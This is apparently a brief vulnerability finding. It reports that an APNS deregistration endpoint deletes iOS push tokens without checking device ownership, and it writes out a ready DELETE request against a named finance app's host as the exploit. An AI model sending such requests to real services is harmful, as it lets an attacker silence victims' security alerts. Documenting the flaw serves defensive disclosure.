diagnosis: APNSDeviceDeregisterView deletes Apple push notification tokens by raw registration_id without verifying that the authenticated caller owns the device. Any user who discovers a device token can deregister victim iOS devices, creating a persistent denial-of-service for security alerts.
exploit_request:
DELETE /api/notifications/apns/unregister/ HTTP/1.1
Host: mobile.financesync.com
Authorization: Bearer test_account_jwt
Content-Type: application/json

{"registration_id": "fe01ab8832efc940b1009841adffea234567890123456789abcdef0123456789"}
